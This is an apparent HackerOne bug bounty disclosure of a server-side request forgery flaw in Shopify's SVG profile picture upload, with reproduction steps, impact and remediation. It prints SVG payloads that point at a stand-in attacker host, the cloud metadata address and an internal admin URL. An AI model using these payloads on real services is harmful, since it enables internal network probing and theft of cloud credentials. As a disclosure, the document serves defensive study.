# Title: SVG Server-Side Request Forgery (SSRF) via Profile Picture Upload

- **Platform**: HackerOne
- **Program**: Shopify Bug Bounty Program
- **Severity**: High
- **Date**: 2017-06-20
- **Researcher**: Redacted (Regression of #97501)
- **Bounty**: $5,000

## Summary
A server-side request forgery vulnerability was discovered in Shopify's profile picture upload functionality. By uploading a specially crafted SVG image with an external resource reference, an attacker could force Shopify's servers to make GET requests to arbitrary URLs.

## Technical Details
Shopify allowed users to upload profile pictures in various formats. SVG (Scalable Vector Graphics) is an XML-based vector image format that supports embedding external resources via elements like `<image>` or `<use>` with `xlink:href` attributes.

When Shopify processed the uploaded SVG, it would attempt to load the external resource specified in the `xlink:href` attribute. This allowed an attacker to:
1. Force GET requests to any URL
2. Scan internal network services
3. Potentially access cloud metadata endpoints
4. Fingerprint internal server libraries by requesting internal paths

## Steps to Reproduce
1. Create an SVG file with a malicious external reference:
   ```xml
   <svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
     <image xlink:href="http://attacker.com/ssrf-test" width="200" height="200"/>
   </svg>
   ```
2. Upload the SVG as a profile picture
3. Monitor the attacker server for incoming requests from Shopify
4. The server-side processing of the SVG triggers the external request

## Proof of Concept
Malicious SVG:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200">
  <image xlink:href="http://169.254.169.254/latest/meta-data/" width="200" height="200"/>
</svg>
```

This could also be used to access internal services:
```xml
<image xlink:href="http://internal-shopify-admin.internal/admin" width="200" height="200"/>
```

## Impact
- Server-side requests to arbitrary URLs
- Internal network scanning
- Potential cloud metadata access
- SMTP relay testing (if email services accessible)
- Internal service fingerprinting
- Bypass of network-level access controls

## Remediation
Shopify fixed the vulnerability by:
1. Sanitizing SVG files and removing external resource references
2. Processing SVG uploads in a sandboxed environment
3. Restricting outbound network access from image processing servers
4. Implementing proper validation of SVG content before rendering

## References
- https://hackerone.com/reports/97501 (original report)
- https://infosecwriteups.com/my-first-bug-blind-ssrf-through-profile-picture-upload-72f00fd27bc6
